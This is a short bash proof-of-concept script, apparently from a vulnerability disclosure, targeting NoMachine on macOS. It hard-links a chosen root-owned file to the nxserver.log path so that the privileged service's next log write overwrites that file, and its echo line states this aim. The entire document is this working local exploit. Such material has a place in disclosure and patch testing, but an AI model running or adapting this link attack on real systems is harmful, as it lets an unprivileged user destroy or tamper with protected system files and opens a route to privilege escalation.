#!/bin/bash

TARGET=/path/to/some/root/owned/file
DEST=/Library/Application\ Support/NoMachine/var/log/nxserver.log

# Assume that the file is not present
ln -f "${TARGET}" "${DEST}"
echo "[*] Created link; once the NoMachine has triggered log write, ${TARGET} will be overwritten"
